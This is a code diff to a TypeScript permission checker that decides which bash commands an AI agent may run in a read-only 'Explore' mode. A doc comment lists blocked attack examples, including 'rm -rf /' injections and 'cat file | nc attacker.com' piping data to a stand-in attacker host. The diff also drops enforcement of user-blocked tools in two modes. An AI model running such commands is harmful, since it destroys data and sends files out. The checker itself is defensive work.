@@ -10,24 +10,40 @@
  * - 'allow-all': Skip all permission checks (everything allowed)
  */
 
+/// <reference path="../types/incr-regex-package.d.ts" />
+
 import { homedir } from 'os';
 import { parse as parseShellCommand, type ParseEntry } from 'shell-quote';
 import { debug } from '../utils/debug.ts';
 import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
 import {
+  validateBashCommand,
+  hasControlCharacters,
+  type BashValidationResult,
+  type BashValidationReason,
+} from './bash-validator.ts';
+import {
   type PermissionMode,
   type ModeConfig,
   type CompiledApiEndpointRule,
+  type CompiledBashPattern,
+  type MismatchAnalysis,
   PERMISSION_MODE_ORDER,
   PERMISSION_MODE_CONFIG,
   SAFE_MODE_CONFIG,
 } from './mode-types.ts';
+
+// Import incr-regex-package for smart pattern mismatch diagnostics
+// This library allows character-by-character matching to find WHERE a regex match failed
+import { IREGEX, DONE, MORE, FAILED } from 'incr-regex-package';
 
 // Re-export types and config from mode-types (single source of truth)
 export {
   type PermissionMode,
   type ModeConfig,
   type CompiledApiEndpointRule,
+  type CompiledBashPattern,
+  type MismatchAnalysis,
   PERMISSION_MODE_ORDER,
   PERMISSION_MODE_CONFIG,
   SAFE_MODE_CONFIG,
@@ -484,15 +500,30 @@ export function hasDangerousSubstitution(command: string): boolean {
 // ============================================================
 
 /**
+ * Pattern info for error messages - shows what patterns might have matched
+ */
+export interface RelevantPatternInfo {
+  source: string;
+  comment?: string;
+}
+
+/**
  * Detailed reason why a bash command was rejected in Explore mode.
  * Used to provide helpful error messages that explain exactly what was blocked and why.
  */
 export type BashRejectionReason =
   | { type: 'control_char'; char: string; charCode: number; explanation: string }
-  | { type: 'no_safe_pattern' }
+  | { type: 'no_safe_pattern'; command: string; relevantPatterns: RelevantPatternInfo[]; mismatchAnalysis?: MismatchAnalysis }
   | { type: 'dangerous_operator'; operator: string; operatorType: 'chain' | 'redirect'; explanation: string }
   | { type: 'dangerous_substitution'; pattern: string; explanation: string }
-  | { type: 'parse_error'; error: string };
+  | { type: 'parse_error'; error: string }
+  // New AST-based rejection types (from bash-validator)
+  | { type: 'pipeline'; explanation: string }
+  | { type: 'redirect'; op: string; explanation: string }
+  | { type: 'command_expansion'; explanation: string }
+  | { type: 'process_substitution'; explanation: string }
+  | { type: 'unsafe_command'; command: string; explanation: string }
+  | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };
 
 /**
  * Human-readable explanations for dangerous operators.
@@ -633,8 +664,194 @@ function findDangerousSubstitution(command: string): { pattern: string; explanat
 }
 
 /**
+ * Find patterns that might be relevant to the attempted command.
+ * Extracts the first word (command name) and finds patterns containing it.
+ * This helps provide actionable error messages when a command is blocked.
+ *
+ * For example, if the command is "git -C /path status", this will find
+ * the git pattern and show the agent what format is expected.
+ */
+function findRelevantPatterns(command: string, patterns: CompiledBashPattern[]): RelevantPatternInfo[] {
+  // Extract the first word (command name) from the command
+  const firstWord = command.trim().split(/\s+/)[0]?.toLowerCase();
+  if (!firstWord) return [];
+
+  // Find patterns whose source contains the command name
+  // This catches patterns like "^git\s+(status|log|...)" when command starts with "git"
+  const relevant: RelevantPatternInfo[] = [];
+
+  for (const pattern of patterns) {
+    // Check if the pattern source contains the command name
+    // Use case-insensitive matching and look for the command at word boundaries
+    const sourceLower = pattern.source.toLowerCase();
+    if (
+      sourceLower.includes(firstWord) ||
+      sourceLower.startsWith(`^${firstWord}`)
+    ) {
+      relevant.push({
+        source: pattern.source,
+        comment: pattern.comment,
+      });
+    }
+  }
+
+  // Limit to top 3 most relevant patterns to avoid overwhelming the agent
+  return relevant.slice(0, 3);
+}
+
+/**
+ * Analyze WHY a command didn't match any pattern using incremental regex matching.
+ * Uses incr-regex-package to find exactly WHERE in the command matching stopped,
+ * which helps generate actionable error messages.
+ *
+ * For example, if the command is "git -C /path status" and the pattern is
+ * "^git\s+(status|log|diff)", this will detect that matching stopped at "-C"
+ * and suggest running from within the repo directory instead.
+ */
+function analyzePatternMismatch(command: string, patterns: CompiledBashPattern[]): MismatchAnalysis | null {
+  const trimmedCommand = command.trim();
+  if (!trimmedCommand) return null;
+
+  // Find the pattern that matches the longest prefix of the command
+  // This gives us the "best match" to analyze
+  let bestMatch: {
+    matchedCount: number;
+    matchedPrefix: string;
+    pattern: CompiledBashPattern;
+  } | null = null;
+
+  for (const pattern of patterns) {
+    try {
+      // Simplify the pattern for incr-regex: remove anchors and word boundaries
+      // which aren't supported by the incremental matching library.
+      // This is fine since we only use it for diagnostic purposes.
+      const simplifiedPattern = pattern.source
+        .replace(/^\^/, '')     // Remove start anchor
+        .replace(/\$$/g, '')    // Remove end anchor
+        .replace(/\\b/g, '');   // Remove word boundaries
+
+      // Create incremental regex matcher from the simplified pattern
+      // IREGEX is a class that takes a regex pattern string in its constructor
+      const incr = new IREGEX(simplifiedPattern);
+
+      // Use matchStr to process the entire command and get match info
+      // Returns [success, charCount, matchedString]
+      const [_success, charCount, matchedStr] = incr.matchStr(trimmedCommand);
+
+      // Track the pattern that matched the most characters (best partial match)
+      if (charCount > 0 && (!bestMatch || charCount > bestMatch.matchedCount)) {
+        bestMatch = {
+          matchedCount: charCount,
+          matchedPrefix: matchedStr || trimmedCommand.substring(0, charCount),
+          pattern,
+        };
+      }
+    } catch {
+      // If incr-regex can't parse the pattern (complex regex features),
+      // skip this pattern - we'll fall back to basic diagnostics
+      continue;
+    }
+  }
+
+  // If no pattern matched anything, return null (unknown command)
+  if (!bestMatch || bestMatch.matchedCount === 0) {
+    return null;
+  }
+
+  // Analyze what token caused the mismatch
+  const failedPosition = bestMatch.matchedCount;
+  const remainingCommand = trimmedCommand.substring(failedPosition).trim();
+  const failedToken = remainingCommand.split(/\s+/)[0] || '';
+
+  // Generate a helpful suggestion based on what we found
+  const suggestion = generateMismatchSuggestion(
+    trimmedCommand,
+    bestMatch.matchedPrefix,
+    failedToken,
+    bestMatch.pattern
+  );
+
+  return {
+    matchedPrefix: bestMatch.matchedPrefix,
+    failedAtPosition: failedPosition,
+    failedToken,
+    bestMatchPattern: {
+      source: bestMatch.pattern.source,
+      comment: bestMatch.pattern.comment,
+    },
+    suggestion,
+  };
+}
+
+/**
+ * Generate an actionable suggestion based on pattern mismatch analysis.
+ * Looks for common patterns like flags before subcommands in git/gh/docker.
+ */
+function generateMismatchSuggestion(
+  command: string,
+  matchedPrefix: string,
+  failedToken: string,
+  pattern: CompiledBashPattern
+): string | undefined {
+  const firstWord = command.split(/\s+/)[0]?.toLowerCase();
+
+  // Detect "flags before subcommand" pattern for git, gh, docker, kubectl
+  const commandsWithSubcommands = ['git', 'gh', 'docker', 'kubectl', 'npm', 'yarn', 'cargo'];
+  if (
+    commandsWithSubcommands.includes(firstWord || '') &&
+    failedToken.startsWith('-')
+  ) {
+    // The command has a flag where a subcommand was expected
+    // Try to find the actual subcommand later in the command
+    const words = command.split(/\s+/);
+    const subcommandCandidates = words.slice(1).filter(w => !w.startsWith('-') && !w.includes('/'));
+
+    if (subcommandCandidates.length > 0) {
+      const likelySubcommand = subcommandCandidates[0];
+      return `The pattern expects \`${firstWord} <subcommand>\` directly, but found flag \`${failedToken}\` first. ` +
+        `Try running from within the target directory, or use: \`${firstWord} ${likelySubcommand} ...\``;
+    }
+
+    return `The pattern expects a subcommand after \`${firstWord}\`, but found flag \`${failedToken}\`. ` +
+      `Run from the target directory or switch to Ask/Auto mode.`;
+  }
+
+  // Detect possible typos in subcommands using simple heuristics
+  // (Check if failedToken is close to any word in the pattern)
+  if (pattern.comment && !failedToken.startsWith('-')) {
+    // Extract subcommand options from pattern comment if present
+    // e.g., "Git read-only operations: view status, history, branches, diffs"
+    const commentLower = pattern.comment.toLowerCase();
+    const failedTokenLower = failedToken.toLowerCase();
+
+    // Check for common subcommand names in the comment
+    const commonSubcommands = ['status', 'log', 'diff', 'show', 'branch', 'list', 'view', 'get', 'describe'];
+    for (const sub of commonSubcommands) {
+      // Simple Levenshtein-ish check: if token is within 2 chars of a known subcommand
+      if (
+        commentLower.includes(sub) &&
+        Math.abs(failedTokenLower.length - sub.length) <= 2 &&
+        failedTokenLower !== sub
+      ) {
+        // Check if first 2 chars match (simple typo detection)
+        if (failedTokenLower.substring(0, 2) === sub.substring(0, 2)) {
+          return `Did you mean \`${firstWord} ${sub}\` instead of \`${firstWord} ${failedToken}\`?`;
+        }
+      }
+    }
+  }
+
+  // Generic fallback
+  return undefined;
+}
+
+/**
  * Get detailed reason why a bash command would be rejected.
  * Returns null if the command is safe, otherwise returns the specific reason.
+ *
+ * Uses AST-based validation for compound commands (&&, ||, ;) to allow
+ * safe compound commands like `git status && git log` while still blocking
+ * dangerous constructs.
  *
  * This is used to provide helpful error messages that explain exactly what
  * was blocked and why, helping the agent understand and avoid the issue.
@@ -642,71 +859,195 @@ function findDangerousSubstitution(command: string): { pattern: string; explanat
 export function getBashRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
   const trimmedCommand = command.trim();
 
-  // Step 1: Check for dangerous control characters
-  const controlChar = findDangerousControlChar(trimmedCommand);
+  // Step 1: Check for dangerous control characters (before parsing)
+  // These could affect parsing itself, so check first
+  const controlChar = hasControlCharacters(trimmedCommand);
   if (controlChar) {
     return {
       type: 'control_char',
       char: controlChar.char,
-      charCode: controlChar.charCode,
+      charCode: 0, // Not used in new flow, but kept for compatibility
       explanation: controlChar.explanation,
     };
   }
 
-  // Step 2: Check if command matches a safe prefix pattern
-  const matchesSafePattern = config.readOnlyBashPatterns.some(pattern => pattern.test(trimmedCommand));
-  if (!matchesSafePattern) {
-    return { type: 'no_safe_pattern' };
+  // Step 2: Use AST-based validation
+  // This handles compound commands, pipelines, redirects, and substitutions properly
+  const astResult = validateBashCommand(trimmedCommand, config.readOnlyBashPatterns);
+
+  if (astResult.allowed) {
+    debug('[Mode] Command allowed via AST validation:', trimmedCommand);
+    return null;
   }
 
-  // Step 3: Check for dangerous operators (command passed safe pattern check)
-  // First check for parse errors
-  try {
-    parseShellCommand(trimmedCommand);
-  } catch (error) {
-    return {
-      type: 'parse_error',
-      error: error instanceof Error ? error.message : 'Unknown parse error',
-    };
+  // Step 3: Convert AST rejection reason to BashRejectionReason
+  if (astResult.reason) {
+    const reason = astResult.reason;
+
+    switch (reason.type) {
+      case 'parse_error':
+        return { type: 'parse_error', error: reason.error };
+
+      case 'pipeline':
+        // Convert to the legacy format for consistent error messages
+        return {
+          type: 'dangerous_operator',
+          operator: '|',
+          operatorType: 'chain',
+          explanation: reason.explanation,
+        };
+
+      case 'redirect':
+        return {
+          type: 'dangerous_operator',
+          operator: reason.op,
+          operatorType: 'redirect',
+          explanation: reason.explanation,
+        };
+
+      case 'command_expansion':
+        return {
+          type: 'dangerous_substitution',
+          pattern: '$()',
+          explanation: reason.explanation,
+        };
+
+      case 'process_substitution':
+        return {
+          type: 'dangerous_substitution',
+          pattern: '<() or >()',
+          explanation: reason.explanation,
+        };
+
+      case 'unsafe_command': {
+        // Find relevant patterns to help the agent understand what format is expected
+        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
+        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
+
+        return {
+          type: 'no_safe_pattern',
+          command: reason.command,
+          relevantPatterns,
+          mismatchAnalysis: mismatchAnalysis ?? undefined,
+        };
+      }
+
+      case 'compound_partial_fail':
+        // Return info about which commands failed in a compound expression
+        return {
+          type: 'compound_partial_fail',
+          failedCommands: reason.failedCommands,
+          passedCommands: reason.passedCommands,
+        };
+
+      case 'background_execution':
+        // Background execution with & operator - convert to dangerous_operator format
+        return {
+          type: 'dangerous_operator',
+          operator: '&',
+          operatorType: 'chain',
+          explanation: reason.explanation,
+        };
+    }
   }
 
-  const operator = findDangerousOperator(trimmedCommand);
-  if (operator) {
-    return {
-      type: 'dangerous_operator',
-      operator: operator.operator,
-      operatorType: operator.operatorType,
-      explanation: operator.explanation,
-    };
+  // Fallback: shouldn't reach here, but return generic rejection if we do
+  debug('[Mode] Unexpected: AST rejected but no reason provided');
+  return {
+    type: 'no_safe_pattern',
+    command: trimmedCommand,
+    relevantPatterns: [],
+    mismatchAnalysis: undefined,
+  };
+}
+
+/**
+ * Format actionable guidance for permission customization.
+ * Tells the agent where to read/modify permissions.
+ */
+function formatPermissionGuidance(config: ToolCheckConfig): string {
+  const lines: string[] = [];
+
+  // Only include guidance if permission paths are available
+  if (config.permissionPaths) {
+    lines.push('');
+    lines.push('To see what commands are allowed in Explore mode, read:');
+    lines.push(`  • ${config.permissionPaths.workspacePath}`);
+    lines.push(`  • ${config.permissionPaths.appDefaultPath}`);
+    lines.push('');
+    lines.push('To understand the permission system and how to customize:');
+    lines.push(`  • ${config.permissionPaths.docsPath}`);
   }
 
-  // Step 4: Check for dangerous substitution
-  const substitution = findDangerousSubstitution(trimmedCommand);
-  if (substitution) {
-    return {
-      type: 'dangerous_substitution',
-      pattern: substitution.pattern,
-      explanation: substitution.explanation,
-    };
-  }
-
-  // Command is safe
-  return null;
+  return lines.join('\n');
 }
 
 /**
  * Format a bash rejection reason into a user-friendly error message.
  * The message explains what was blocked and why, helping the agent understand the issue.
+ * Includes actionable guidance on how to customize permissions.
  */
 export function formatBashRejectionMessage(reason: BashRejectionReason, config: ToolCheckConfig): string {
   const modeSwitchHint = `Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`;
+  const permissionGuidance = formatPermissionGuidance(config);
 
   switch (reason.type) {
     case 'control_char':
       return `Bash command blocked: contains "${reason.char}" character. ${reason.explanation}. ${modeSwitchHint}`;
 
-    case 'no_safe_pattern':
-      return `This Bash command is not in the read-only allowlist for ${config.displayName}. ${modeSwitchHint}`;
+    case 'no_safe_pattern': {
+      // Build a helpful message showing what patterns might be relevant
+      const lines: string[] = [];
+      lines.push(`Bash command \`${reason.command}\` is not in the read-only allowlist.`);
+
+      // If we have mismatch analysis, show detailed diagnostics first (most helpful)
+      if (reason.mismatchAnalysis) {
+        const analysis = reason.mismatchAnalysis;
+        lines.push('');
+
+        // Show what matched and where it failed
+        if (analysis.matchedPrefix) {
+          lines.push(`Matched: \`${analysis.matchedPrefix}\` (${analysis.failedAtPosition} chars)`);
+        }
+        if (analysis.failedToken) {
+          lines.push(`Failed at: \`${analysis.failedToken}\` (position ${analysis.failedAtPosition})`);
+        }
+
+        // Show the actionable suggestion if we have one
+        if (analysis.suggestion) {
+          lines.push('');
+          lines.push(analysis.suggestion);
+        }
+
+        // Show which pattern was closest to matching
+        if (analysis.bestMatchPattern?.comment) {
+          lines.push('');
+          lines.push(`Pattern: ${analysis.bestMatchPattern.comment}`);
+        }
+      } else if (reason.relevantPatterns.length > 0) {
+        // Fall back to showing relevant patterns if no mismatch analysis
+        lines.push('');
+        lines.push('Relevant pattern(s) that might match:');
+        for (const pattern of reason.relevantPatterns) {
+          // Show the pattern regex (simplified for readability)
+          const patternDisplay = pattern.source.length > 80
+            ? pattern.source.substring(0, 77) + '...'
+            : pattern.source;
+          lines.push(`  Pattern: \`${patternDisplay}\``);
+          if (pattern.comment) {
+            lines.push(`  → ${pattern.comment}`);
+          }
+        }
+        lines.push('');
+        lines.push('The command must match the pattern exactly from the start.');
+      }
+
+      // Add permission guidance for pattern-based rejections
+      lines.push(permissionGuidance);
+      lines.push('');
+      lines.push(modeSwitchHint);
+      return lines.join('\n');
+    }
 
     case 'dangerous_operator':
       return `Bash command blocked: contains "${reason.operator}" operator. This ${reason.explanation}. Run commands separately or switch to Ask mode.`;
@@ -716,52 +1057,88 @@ export function formatBashRejectionMessage(reason: BashRejectionReason, config: 
 
     case 'parse_error':
       return `Bash command blocked: could not parse command safely (${reason.error}). ${modeSwitchHint}`;
+
+    case 'compound_partial_fail': {
+      // Some commands in a compound expression failed
+      const lines: string[] = [];
+      lines.push('Bash command blocked: compound command contains unsafe operations.');
+      lines.push('');
+      if (reason.passedCommands.length > 0) {
+        lines.push('✓ Allowed commands:');
+        for (const cmd of reason.passedCommands) {
+          lines.push(`  • \`${cmd}\``);
+        }
+      }
+      if (reason.failedCommands.length > 0) {
+        lines.push('✗ Blocked commands (not in read-only allowlist):');
+        for (const cmd of reason.failedCommands) {
+          lines.push(`  • \`${cmd}\``);
+        }
+      }
+      // Add permission guidance for compound command failures
+      lines.push(permissionGuidance);
+      lines.push('');
+      lines.push(modeSwitchHint);
+      return lines.join('\n');
+    }
+
+    // New AST-based types (shouldn't reach here as they're converted above, but handle for completeness)
+    case 'pipeline':
+      return `Bash command blocked: contains pipeline (|). ${reason.explanation}. ${modeSwitchHint}`;
+
+    case 'redirect':
+      return `Bash command blocked: contains "${reason.op}" redirect. This ${reason.explanation}. ${modeSwitchHint}`;
+
+    case 'command_expansion':
+      return `Bash command blocked: contains command substitution. ${reason.explanation}. ${modeSwitchHint}`;
+
+    case 'process_substitution':
+      return `Bash command blocked: contains process substitution. ${reason.explanation}. ${modeSwitchHint}`;
+
+    case 'unsafe_command': {
+      const lines: string[] = [];
+      lines.push(`Bash command blocked: \`${reason.command}\` is not in the read-only allowlist.`);
+      lines.push(permissionGuidance);
+      lines.push('');
+      lines.push(modeSwitchHint);
+      return lines.join('\n');
+    }
   }
 }
 
 /**
  * Check if a Bash command is read-only using the given config.
  *
+ * Uses AST-based validation to properly handle compound commands like
+ * `git status && git log` - each part is validated separately, and the
+ * command is allowed only if ALL parts pass.
+ *
  * A command is considered safe if:
  * 1. It does NOT contain dangerous control characters (newlines, etc.)
- * 2. It matches one of the read-only patterns (e.g., starts with `ls`, `cat`, `git status`)
- * 3. It does NOT contain dangerous shell operators (&&, ||, ;, |, >, >>)
- * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
+ * 2. All simple commands match read-only patterns
+ * 3. It does NOT contain pipelines (|) - these transform data between commands
+ * 4. It does NOT contain redirects (>, >>, <) - these modify files
+ * 5. It does NOT contain command/process substitution ($(), ``, <(), >())
  *
  * This multi-step check prevents attacks like:
  * - `ls\nrm -rf /` (newline injection)
- * - `ls && rm -rf /` (command chaining)
+ * - `git status && rm -rf /` (dangerous command in chain)
+ * - `cat file | nc attacker.com` (pipeline to dangerous command)
  * - `ls $(rm -rf /)` (command substitution)
- * - `cat <(curl http://evil.com)` (process substitution)
  */
-function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
-  const trimmedCommand = command.trim();
-
-  // Step 1: Reject commands with dangerous control characters (newlines act as command separators)
-  if (hasDangerousControlChars(trimmedCommand)) {
-    debug(`[Mode] Command contains dangerous control characters`);
-    return false;
-  }
-
-  // Step 2: Check if command matches a safe prefix pattern
-  const matchesSafePattern = config.readOnlyBashPatterns.some(pattern => pattern.test(trimmedCommand));
-  if (!matchesSafePattern) {
-    return false;
-  }
-
-  // Step 3: Verify no dangerous operators (prevents chaining attacks)
-  if (hasDangerousShellOperators(trimmedCommand)) {
-    debug(`[Mode] Command "${trimmedCommand}" matches safe pattern but contains dangerous operators`);
-    return false;
-  }
-
-  // Step 4: Verify no command/process substitution (prevents embedded command execution)
-  if (hasDangerousSubstitution(trimmedCommand)) {
-    debug(`[Mode] Command "${trimmedCommand}" matches safe pattern but contains dangerous substitution`);
-    return false;
-  }
-
-  return true;
+/**
+ * Check if a Bash command is read-only using a custom config.
+ * Exported for testing purposes.
+ *
+ * @param command - The bash command to check
+ * @param config - Tool check configuration with patterns
+ * @returns true if command is safe to run in read-only mode
+ */
+export function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
+  // Use getBashRejectionReason which now uses AST-based validation
+  // If no rejection reason, command is safe
+  const rejection = getBashRejectionReason(command, config);
+  return rejection === null;
 }
 
 /**
@@ -880,27 +1257,13 @@ export function shouldAllowToolInMode(
     config = SAFE_MODE_CONFIG;
   }
 
-  // In 'allow-all' mode, only check explicitly blocked tools from permissions.json
-  // (not safe mode defaults like Write, Edit, etc.)
+  // In 'allow-all' mode, all tools are allowed (no restrictions)
   if (mode === 'allow-all') {
-    if (config.customBlockedTools?.has(toolName)) {
-      return {
-        allowed: false,
-        reason: `Tool "${toolName}" is explicitly blocked in permissions.json`
-      };
-    }
     return { allowed: true };
   }
 
-  // In 'ask' mode, only check explicitly blocked tools from permissions.json
-  // (not safe mode defaults like Write, Edit, etc.)
+  // In 'ask' mode, all tools are allowed (user will be prompted for confirmation)
   if (mode === 'ask') {
-    if (config.customBlockedTools?.has(toolName)) {
-      return {
-        allowed: false,
-        reason: `Tool "${toolName}" is explicitly blocked in permissions.json`
-      };
-    }
     return { allowed: true };
   }
 
